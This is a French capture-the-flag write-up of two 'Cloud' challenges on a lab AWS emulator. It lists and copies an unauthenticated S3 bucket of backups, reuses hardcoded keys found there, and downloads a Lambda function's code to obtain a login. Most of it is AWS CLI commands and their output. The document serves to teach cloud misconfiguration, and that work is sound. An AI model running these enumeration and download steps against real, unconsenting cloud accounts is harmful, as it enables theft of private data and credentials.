# Cloud [1/2]

## Description

Un de vos amis a découvert le monde du cloud, et passe son temps à frimer en utilisant plein de services différents. Le pire, c'est qu'il exige une somme faramineuse pour partager ses connaissances ! On dirait cependant qu'il n'est pas très porté sur la sécurité...

Apparemment, il utilise un système qu'il appelle `Super Stockage Sécurisé` pour sauvegarder ses données. Montrez-lui que le cloud présente aussi des dangers en volant ses sauvegardes !

> Attention ! Les services déployés ne comportent aucune authentification, mais les challenges ne requièrent aucune authentification. Merci de ne rien modifier pour ne pas casser le challenge !

## Writeup

Aperçu du site web :

![](https://github.com/Niceclear/CTF-Writeups/blob/main/Star2022/Cloud/images/1.png)

Le site `...nuagews...` ne renvoie rien.

`Super Stockage Sécurisé` me fait penser à la solution de stockage `S3`.

*Ce site répertorie de la documentation : [AWS - Pentest Book](https://pentestbook.six2dez.com/enumeration/cloud/aws)*

On tente de visualiser les buckets :

```bash
aws s3 ls --endpoint-url endpoint --no-sign-request                       
2022-09-07 08:32:40 backups
```

Il y a un bucket `backups`.

On peut regarder son contenu :

```bash
aws s3 ls s3://backups --endpoint-url endpoint --no-sign-request 

2022-09-07 08:32:41        644 backup-27-08-2022.7z
2022-09-07 08:32:41        582 backup-29-08-2022.7z
```

On peut copier les fichiers du bucket en local :

```bash
aws s3 cp s3://backups ./s3 --recursive --endpoint-url  endpoint --no-sign-request          

download: s3://backups/backup-29-08-2022.7z to s3/backup-29-08-2022.7z
download: s3://backups/backup-27-08-2022.7z to s3/backup-27-08-2022.7z
```

On extrait et on a deux fichiers python.

L'un des deux contient :

```bash
import boto3
from flask import *
import json

app = Flask(__name__)

client = boto3.client('lambda', endpoint_url="http://172.17.0.2:4566", aws_secret_access_key="flag", aws_access_key_id="id")

@app.route('/', methods=["GET", "POST"])
def welcome():
    if request.method == "GET":
        return render_template("welcome.html", logged="empty")
    else:
        username, password = request.form.get("username"), request.form.get("password")
        username, password = username.encode(), password.encode()
        response = client.invoke(
            FunctionName="verify_password",
            Payload=b'{"username": "%b", "password": "%b"}' % (username, password)
        )
        if json.loads(response['Payload'].read())["logged in"]:
            return render_template("welcome.html", logged="Yes")
        else:
            return render_template("welcome.html", logged="No")


if __name__ == "__main__":
    app.run(debug=True)
```

# Cloud [2/2]

## Description

Maintenant que vous avez accédé aux sauvegardes de votre ami, il est temps de prendre le contrôle de son site web !

Récupérez son mot de passe et utilisez-le pour accéder à ses secrets !

Attention, bien que son site ait l'air assez banal, votre ami s'est vanté d'utiliser un système d'authentification infaillible reposant sur le système `Gamma`. Il ne s'agit peut-être pas d'un fonctionnement normal... Ou dirais-je, d'un fonctionnement lambda ?

> Attention ! Les services déployés ne comportent aucune authentification, mais les challenges ne requièrent aucune authentification. Merci de ne rien modifier pour ne pas casser le challenge !

## Writeup

Dans l'un des fichiers python, on peut comprendre qu'il y a des functions lambda. La description de la partie deux parle aussi de lambda.

On peut chercher du côté des fonctions lambda.

Nous avons des identifiants, nous allons les utiliser.

*Documentation :  [AWS CLI - ENV](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-envvars.html)*


```bash
export AWS_ACCESS_KEY_ID=id
export AWS_SECRET_ACCESS_KEY=flag
```

```bash
aws lambda list-functions --endpoint-url endpoint                   
{
    "Functions": [
        {
            "FunctionName": "verify_password",
            "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:verify_password",
            "Runtime": "python3.8",
            "Role": "arn:aws:iam::000000000000:user/xxxxx",
            "Handler": "verify_password.handler",
            "CodeSize": 335,
            "Description": "",
            "Timeout": 3,
            "LastModified": "",
            "CodeSha256": "",
            "Version": "$LATEST",
            "VpcConfig": {},
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "",
            "State": "Active",
            "LastUpdateStatus": "Successful",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ]
        }
    ]
}
```

Nous récupérons la fonction avec la commande suivante :

```bash
aws lambda  get-function --function-name verify_password  --endpoint-url endpoint                   
{
    "Configuration": {
        "FunctionName": "verify_password",
        "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:verify_password",
        "Runtime": "python3.8",
        "Role": "arn:aws:iam::000000000000:user/xxxxx",
        "Handler": "verify_password.handler",
        "CodeSize": 335,
        "Description": "",
        "Timeout": 3,
        "LastModified": "",
        "CodeSha256": "",
        "Version": "$LATEST",
        "VpcConfig": {},
        "TracingConfig": {
            "Mode": "PassThrough"
        },
        "RevisionId": "",
        "State": "Active",
        "LastUpdateStatus": "Successful",
        "PackageType": "Zip",
        "Architectures": [
            "x86_64"
        ]
    },
    "Code": {
        "Location": "endpoint/2015-03-31/functions/verify_password/code"
    },
    "Tags": {}
}
```

Nous avons l'URL où est localisé le code

```bash
wget http://endpoint/2015-03-31/functions/verify_password/code
mv code code.zip
unzip code.zip

cat verify_password.py 
def handler(event, context):
    if event['username'] == "pseudo" and event['password'] == "password":
        return {"logged in": True}
    else:
        return {"logged in": False}
```

Nous nous connectons avec les identifiants présents dans la fonction :

![](https://github.com/Niceclear/CTF-Writeups/blob/main/Star2022/Cloud/images/2.png)

